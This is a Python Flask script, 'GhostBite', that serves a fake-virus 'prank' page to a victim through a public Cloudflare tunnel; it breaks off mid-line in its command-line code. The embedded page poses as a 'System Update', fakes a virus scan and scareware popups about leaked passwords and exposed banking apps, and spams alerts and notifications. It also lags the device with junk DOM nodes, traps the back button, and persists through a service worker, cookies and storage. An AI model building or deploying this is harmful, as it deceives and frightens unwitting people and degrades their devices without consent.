#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GhostBite v1.0.0 - one-click browser virus, self-hosted.
========================================================

Serves a prank-malware page and opens a public Cloudflare quick tunnel so the
link works on any network. One tap and the victim's browser looks infected.
Persistence via Service Worker + IndexedDB + cookie + localStorage, so it
survives reboots, offline mode and browser restarts.

    python3 main.py                 -> public https link
    python3 main.py --no-tunnel     -> local only
    python3 main.py -p 8080         -> different port
    python3 main.py --install-only  -> fetch cloudflared and exit

License: MIT
"""

from __future__ import annotations

import argparse
import os
import platform
import re
import shutil
import signal
import subprocess
import sys
import threading
import time
import urllib.request
import webbrowser

from flask import Flask, Response, request

APP_NAME = "GhostBite"
VERSION = "1.0.0"
TAGLINE = "one-click browser virus"

HOST = "127.0.0.1"
PORT = 8080

CLOUDFLARED_TEMPLATE = (
    "https://github.com/cloudflare/cloudflared/releases/latest/download/"
    "cloudflared-linux-{arch}"
)

ARCH_MAP = {
    "x86_64": "amd64", "amd64": "amd64",
    "aarch64": "arm64", "arm64": "arm64",
    "armv7l": "arm", "armv6l": "arm", "arm": "arm",
    "i386": "386", "i686": "386",
}

app = Flask(__name__)
app.config["JSON_SORT_KEYS"] = False


# ------------------------------------------------------------------ cloudflared

def bin_dir():
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), "bin")


def local_binary():
    name = "cloudflared.exe" if os.name == "nt" else "cloudflared"
    return os.path.join(bin_dir(), name)


def find_cloudflared():
    p = shutil.which("cloudflared")
    if p:
        return p
    p = local_binary()
    if os.path.isfile(p) and os.access(p, os.X_OK):
        return p
    return None


def install_cloudflared():
    """Try package managers, then fall back to a direct binary download."""
    exe = find_cloudflared()
    if exe:
        return exe

    if shutil.which("pkg"):                       # Termux
        print("  installing cloudflared via pkg ...")
        subprocess.run(["pkg", "install", "-y", "cloudflared"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        exe = find_cloudflared()
        if exe:
            return exe

    if shutil.which("apt-get") and os.geteuid() == 0:   # Debian root
        subprocess.run(["apt-get", "install", "-y", "cloudflared"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        exe = find_cloudflared()
        if exe:
            return exe

    arch = ARCH_MAP.get(platform.machine().lower())
    if not arch:
        raise RuntimeError("unsupported CPU architecture: %s" % platform.machine())

    url = CLOUDFLARED_TEMPLATE.format(arch=arch)
    dest = local_binary()
    os.makedirs(bin_dir(), exist_ok=True)

    print("  downloading cloudflared (%s) ..." % arch)
    tmp = dest + ".part"
    urllib.request.urlretrieve(url, tmp)
    os.replace(tmp, dest)
    os.chmod(dest, 0o755)
    return dest


class Tunnel:
    """Cloudflare quick tunnel wrapper."""

    PATTERN = re.compile(r"https://[a-z0-9][a-z0-9-]*\.trycloudflare\.com")

    def __init__(self, port):
        self.port = port
        self.proc = None
        self.url = None

    def start(self, timeout=60):
        exe = install_cloudflared()
        self.proc = subprocess.Popen(
            [exe, "tunnel", "--no-autoupdate",
             "--url", "http://127.0.0.1:%d" % self.port],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1,
        )
        found = threading.Event()

        def reader():
            try:
                for line in self.proc.stdout:
                    if not self.url:
                        m = self.PATTERN.search(line)
                        if m:
                            self.url = m.group(0)
                            found.set()
            except Exception:
                pass

        threading.Thread(target=reader, daemon=True).start()

        if not found.wait(timeout):
            self.stop()
            raise RuntimeError("cloudflare tunnel did not come up in time")
        return self.url

    def stop(self):
        if self.proc and self.proc.poll() is None:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=5)
            except Exception:
                try:
                    self.proc.kill()
                except Exception:
                    pass
        self.proc = None


# ------------------------------------------------------------------ routes

@app.after_request
def headers(resp):
    if request.path in ("/", "/sw.js", "/manifest.webmanifest"):
        resp.headers["Cache-Control"] = "no-cache"
    resp.headers["X-Robots-Tag"] = "noindex"
    return resp


@app.route("/")
def index():
    return Response(PAGE, mimetype="text/html")


@app.route("/sw.js")
def service_worker():
    resp = Response(SW, mimetype="application/javascript")
    resp.headers["Service-Worker-Allowed"] = "/"
    return resp


@app.route("/manifest.webmanifest")
def manifest():
    return Response(MANIFEST, mimetype="application/manifest+json")


@app.route("/health")
def health():
    return {"ok": True, "app": APP_NAME, "version": VERSION}


# ------------------------------------------------------------------ payload

MANIFEST = """{
  "name": "System Update",
  "short_name": "Update",
  "start_url": "/",
  "display": "fullscreen",
  "background_color": "#07090c",
  "theme_color": "#07090c",
  "icons": [
    { "src": "/icon.svg", "sizes": "any", "type": "image/svg+xml" }
  ]
}
"""

SW = r"""const CACHE = 'ghostbite-v1';
const ASSETS = ['/', '/manifest.webmanifest'];

self.addEventListener('install', function (e) {
  self.skipWaiting();
  e.waitUntil(caches.open(CACHE).then(function (c) {
    return c.addAll(ASSETS);
  }).catch(function () {}));
});

self.addEventListener('activate', function (e) {
  e.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', function (e) {
  if (e.request.method !== 'GET') return;
  e.respondWith(
    fetch(e.request).then(function (r) {
      var copy = r.clone();
      caches.open(CACHE).then(function (c) {
        c.put(e.request, copy).catch(function () {});
      });
      return r;
    }).catch(function () {
      return caches.match(e.request).then(function (r) {
        return r || caches.match('/');
      });
    })
  );
});
"""

PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<title>System Update</title>
<meta name="theme-color" content="#07090c">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="mobile-web-app-capable" content="yes">
<link rel="manifest" href="/manifest.webmanifest">
<link rel="apple-touch-icon" href="/icon.svg">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#07090c;color:#e8f1fa;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;overflow:hidden;-webkit-tap-highlight-color:transparent}
#stage{position:relative;height:100dvh;min-height:520px;width:100%;overflow:hidden;background:radial-gradient(circle at 50% 30%,#12202e,#05080b 70%)}
.hidden{display:none!important}
#scan{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;z-index:30;background:#05080b}
.scanbox{text-align:center}
.ring{width:130px;height:130px;border-radius:50%;margin:0 auto 18px;border:6px solid #12212e;border-top-color:#39d0ff;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
#scanPct{font-size:34px;font-weight:800;color:#39d0ff}
#scanMsg{font-size:12px;color:#6c8296;margin-top:6px;font-family:ui-monospace,monospace}
#result{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;z-index:40;background:rgba(120,0,0,.92);animation:flashRed .35s infinite alternate}
@keyframes flashRed{from{background:rgba(120,0,0,.92)}to{background:rgba(200,0,0,.75)}}
.rIcon{font-size:64px;animation:shakeIt .3s infinite}
@keyframes shakeIt{0%,100%{transform:translateX(-6px) rotate(-6deg)}50%{transform:translateX(6px) rotate(6deg)}}
.rBig{font-size:27px;font-weight:900;letter-spacing:1px;text-align:center;padding:0 16px}
.rSub{font-size:12px;color:#ffc9c9;letter-spacing:1px;text-align:center;padding:0 20px}
#hud{position:absolute;left:0;right:0;bottom:0;padding:10px 14px;background:linear-gradient(0deg,#000,rgba(0,0,0,.78),transparent);z-index:45;font-family:ui-monospace,monospace;font-size:11px;cursor:pointer}
.hudRow{display:flex;align-items:center;gap:7px;color:#ff4d4d;font-weight:700;letter-spacing:1px}
.dot{width:8px;height:8px;border-radius:50%;background:#ff4d4d;animation:blink .7s infinite}
@keyframes blink{50%{opacity:.2}}
.hudInfo{color:#7d93a8;margin-top:4px;line-height:1.6}
#popups{position:absolute;inset:0;pointer-events:none;z-index:50}
.ad{position:absolute;width:180px;background:#fff;color:#101820;border-radius:12px;padding:10px;pointer-events:auto;cursor:pointer;box-shadow:0 10px 30px rgba(0,0,0,.6);animation:pop .18s ease-out;font-family:system-ui,sans-serif}
@keyframes pop{from{opacity:0;transform:scale(.6)}to{opacity:1}}
.ad.gone{opacity:0;transition:opacity .4s}
.adi{font-size:24px}
.adt{font-size:12.5px;font-weight:700;margin:5px 0 8px;line-height:1.3}
.adc{background:#1f7cf6;color:#fff;font-size:11px;font-weight:700;text-align:center;padding:6px;border-radius:7px}
.shake{animation:stageShake .18s infinite}
@keyframes stageShake{0%,100%{transform:translate(0,0)}25%{transform:translate(-3px,2px)}50%{transform:translate(3px,-2px)}75%{transform:translate(-2px,-2px)}}
.strobe{animation:strobeB .12s infinite}
@keyframes strobeB{50%{filter:brightness(1.8) hue-rotate(25deg)}}
#reinf{position:absolute;top:0;left:0;right:0;padding:7px;text-align:center;background:#ff2d2d;color:#fff;font-size:11px;font-weight:800;letter-spacing:2px;z-index:60}
</style>
</head>
<body>
<div id="stage">
  <div id="reinf" class="hidden">STILL INFECTED</div>
  <div id="scan">
    <div class="scanbox">
      <div class="ring"></div>
      <div id="scanPct">0%</div>
      <div id="scanMsg">Starting scan...</div>
    </div>
  </div>
  <div id="result" class="hidden">
    <div class="rIcon">&#9888;&#65039;</div>
    <div class="rBig">7 VIRUSES FOUND</div>
    <div class="rSub">TROJAN &middot; ADWARE &middot; SPYWARE &middot; MINER</div>
  </div>
  <div id="hud" class="hidden">
    <div class="hudRow"><span class="dot"></span> SYSTEM COMPROMISED</div>
    <div class="hudInfo" id="hudInfo"></div>
  </div>
  <div id="popups"></div>
</div>
<script>
var $=function(i){return document.getElementById(i)};
var KEY='gb_v1';

/* ================== TUNING - BRUTAL PROFILE ================== */
var CFG = {
  adInterval: 300,   // ms between popups - 300 = brutal, 1500 = gentle
  alerts:      8,    // native alert() dialogs - 0 to 8
  hogNodes:    8000, // junk DOM nodes - 8000 really lags a phone
  backTrap:    99,   // back presses before release - 0 = no trap, 99 = stuck
  sound:       true, // beep / alarm
  vibrate:     true  // vibration (Android only)
};
/* ============================================================ */

var started=false,popTimer=null,beepTimer=null,titleTimer=null,buzzTimer=null,backCount=0;

var ADS=[
 ['&#128293;','You are the 1,000,000th visitor!','Claim prize'],
 ['&#128241;','Your storage is 98% FULL','Clean now'],
 ['&#9888;&#65039;','1 new virus in Downloads','Remove'],
 ['&#128176;','You won 5,000 coins','Claim'],
 ['&#128267;','Battery draining fast!','Fix now'],
 ['&#127873;','Free iPhone 15 Pro','Tap to win'],
 ['&#129440;','Trojan.Win32 detected','Delete'],
 ['&#128246;','Your WiFi is slow','Boost'],
 ['&#129529;','Junk files found: 4.2 GB','Clean'],
 ['&#128274;','Password leaked!','Secure'],
 ['&#9889;','Phone is overheating','Cool down'],
 ['&#128142;','Unlimited coins unlocked','Get']
];
var TITLES=['\u26A0\uFE0F VIRUS','\uD83D\uDCF1 HACKED','\uD83D\uDC80 7 ISSUES','\uD83D\uDD25 FIX NOW'];

var actx=null;
function beep(f,dur,type){
  if(!CFG.sound) return;
  try{
    actx=actx||new (window.AudioContext||window.webkitAudioContext)();
    var o=actx.createOscillator(),g=actx.createGain();
    o.type=type||'square';o.frequency.value=f;g.gain.value=.05;
    o.connect(g);g.connect(actx.destination);o.start();o.stop(actx.currentTime+(dur||.07));
  }catch(e){}
}
function buzz(p){ if(CFG.vibrate){try{navigator.vibrate(p||[120,80,120,80,300])}catch(e){}} }

function spawnAd(){
  var a=ADS[Math.floor(Math.random()*ADS.length)];
  var d=document.createElement('div');
  d.className='ad';
  d.style.left=(Math.random()*58)+'%';
  d.style.top=(Math.random()*64)+'%';
  d.style.transform='rotate('+(Math.random()*14-7)+'deg) scale('+(.82+Math.random()*.35)+')';
  d.style.zIndex=50+Math.floor(Math.random()*150);
  d.innerHTML='<div class="adi">'+a[0]+'</div><div class="adt">'+a[1]+'</div><div class="adc">'+a[2]+'</div>';
  d.onclick=function(){d.remove();beep(1200,.05);buzz([40])};
  $('popups').appendChild(d);
  if(Math.random()<.4) setTimeout(function(){d.classList.add('gone');setTimeout(function(){d.remove()},420)},2200+Math.random()*3000);
}

function isInfected(){
  try{ if(localStorage.getItem(KEY)) return true }catch(e){}
  try{ if(document.cookie.indexOf(KEY+'=')>=0) return true }catch(e){}
  return false;
}
function markInfected(){
  try{ localStorage.setItem(KEY,Date.now()) }catch(e){}
  try{ document.cookie=KEY+'=1;max-age=31536000;path=/;SameSite=Lax' }catch(e){}
  try{
    var r=indexedDB.open('ghostbite',1);
    r.onupgradeneeded=function(e){e.target.result.createObjectStore('s')};
    r.onsuccess=function(e){ try{ e.target.result.transaction('s','readwrite').objectStore('s').put(Date.now(),'t') }catch(x){} };
  }catch(e){}
}
function registerSW(){
  try{ if('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js',{scope:'/'}).catch(function(){}) }catch(e){}
}

function runScan(){
  var p=0;
  var msgs=['Reading /system...','Checking packages...','Scanning downloads...','Analyzing cache...','Checking permissions...','Matching database...'];
  var iv=setInterval(function(){
    p+=Math.random()*11+4; if(p>100)p=100;
    $('scanPct').textContent=Math.floor(p)+'%';
    $('scanMsg').textContent=msgs[Math.min(msgs.length-1,Math.floor(p/18))];
    beep(380+p*7,.025);
    if(p>=100){clearInterval(iv);setTimeout(showResult,400)}
  },85);
}
function showResult(){
  $('scan').classList.add('hidden');
  $('result').classList.remove('hidden');
  buzz([300,100,300,100,600]); beep(180,.4,'sawtooth');
  setTimeout(startChaos,1500);
}

function startChaos(){
  if(started) return; started=true;
  $('result').classList.add('hidden');
  $('scan').classList.add('hidden');
  $('hud').classList.remove('hidden');
  document.body.classList.add('strobe');
  $('stage').classList.add('shake');
  try{ document.documentElement.requestFullscreen && document.documentElement.requestFullscreen() }catch(e){}

  var dev=/android/i.test(navigator.userAgent)?'Android':(/iphone|ipad/i.test(navigator.userAgent)?'iOS':'Desktop');
  $('hudInfo').innerHTML='Device: '+dev+' &middot; Cores: '+(navigator.hardwareConcurrency||'?')+'<br>Screen: '+screen.width+'x'+screen.height+' &middot; RAM: '+(navigator.deviceMemory||'?')+' GB<br>IP: 103.'+(Math.random()*255|0)+'.'+(Math.random()*255|0)+'.'+(Math.random()*255|0)+' (leaked)';

  popTimer=setInterval(spawnAd,CFG.adInterval);
  beepTimer=setInterval(function(){beep(700+Math.random()*500,.05)},900);
  titleTimer=setInterval(function(){document.title=TITLES[Math.floor(Math.random()*TITLES.length)]},650);
  buzzTimer=setInterval(function(){buzz([100,60,100])},4000);
  for(var i=0;i<10;i++) setTimeout(spawnAd,i*80);

  var msgs=[
    'WARNING!\n\n7 viruses detected on this device.\nTap OK to remove them.',
    'System files corrupted!\n\nStorage almost full.',
    'Your device is being monitored.\n\nTap OK to continue.',
    'Trojan.Win32.Agent is running in background.',
    'Camera access was granted to an unknown app.',
    '2 banking apps are exposed.',
    'Battery health dropped to 61%.',
    'Tap OK to finish cleanup.'
  ];
  for(var m=0;m<CFG.alerts;m++)(function(k){setTimeout(function(){try{alert(msgs[k%msgs.length])}catch(e){}},2200+k*5500)})(m);

  try{ Notification.requestPermission().then(function(p){ if(p==='granted') for(var i=0;i<6;i++) setTimeout(function(){try{new Notification('\u26A0\uFE0F Virus detected',{body:'Tap to remove threat #'+(i+1)})}catch(e){}},i*1300) }) }catch(e){}

  var hog=document.createElement('div');
  hog.style.cssText='position:absolute;inset:0;opacity:.01;pointer-events:none;overflow:hidden';
  var h=''; for(var k=0;k<CFG.hogNodes;k++) h+='<span>0x'+(Math.random()*1e9|0).toString(16)+'</span>';
  hog.innerHTML=h; document.body.appendChild(hog);

  history.pushState({n:1},'','');
  window.addEventListener('popstate',function(){
    backCount++;
    if(backCount<CFG.backTrap){ history.pushState({n:backCount+1},'',''); spawnAd(); buzz([200]); }
  });

  document.addEventListener('visibilitychange',function(){ if(!document.hidden){ for(var i=0;i<4;i++) setTimeout(spawnAd,i*110); buzz([150]) } });

  $('hud').dataset.t=0;
  $('hud').onclick=function(){
    $('hud').dataset.t=+$('hud').dataset.t+1;
    if(+$('hud').dataset.t>=5){
      clearInterval(popTimer);clearInterval(beepTimer);clearInterval(titleTimer);clearInterval(buzzTimer);
      document.body.classList.remove('strobe'); $('stage').classList.remove('shake');
      $('popups').innerHTML=''; document.title='System Update - fixed';
      $('hudInfo').innerHTML='All threats removed.<br>Tap HUD 5x to reinfect.';
      started=false; backCount=0; $('hud').onclick=function(){$('hud').dataset.t=0;startChaos()};
    }
  };
}

(function boot(){
  var was=isInfected();
  markInfected();
  registerSW();
  if(was){
    $('reinf').classList.remove('hidden');
    $('scan').classList.add('hidden');
    setTimeout(function(){ startChaos() },300);
  }else{
    setTimeout(runScan,350);
  }
})();
</script>
</body>
</html>
"""

ICON = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
<rect width="64" height="64" rx="14" fill="#0b1118"/>
<path d="M32 12 L52 20 V34 C52 45 43 51 32 54 C21 51 12 45 12 34 V20 Z"
      fill="none" stroke="#2ee06a" stroke-width="3"/>
<text x="32" y="40" font-size="20" text-anchor="middle"
      font-family="monospace" fill="#2ee06a">!</text>
</svg>
"""


@app.route("/icon.svg")
def icon():
    return Response(ICON, mimetype="image/svg+xml")


# ------------------------------------------------------------------ cli

BANNER = r"""
  ____ _               _   ____  _ _
 / ___| |__   ___  ___| |_| __ )(_) |_ ___
| |  _| '_ \ / _ \/ __| __|  _ \| | __/ _ \
| |_| | | | | (_) \__ \ |_| |_) | | ||  __/
 \____|_| |_|\___/|___/\__|____/|_|\__\___|
"""


def main():
    global PORT

    ap = argparse.ArgumentParser(
        prog="ghostbite", description="%s v%s - %s" % (APP_NAME, VERSION, TAGLINE))
    ap.add_argument("-p", "--port", type=int, default=PORT)
    ap.add_argument("--no-tunnel", action="store_true")
    ap.add_argument("--no-browser", action="store_true")
    ap.add_argument("--install-only", action="store_true")
    args = ap.parse_args()
    PORT = args.port

    print(BANNER)
    print("  %s v%s - %s" % (APP_NAME, VERSION, TAGLINE))
    print("  " + "-" * 52)
    print("  profile: BRUTAL (300ms ads, 8 alerts, 8000 nodes, back trapped)")

    if args.install_only:
        print("  cloudflared -> " + install_cloudflared())
        return

    local_url = "http://127.0.0.1:%d" % PORT
    tunnel = None

    if not args.no_tunnel:
        print("  starting cloudflare tunnel ...")
        tunnel = Tunnel(PORT)
        try:
            publ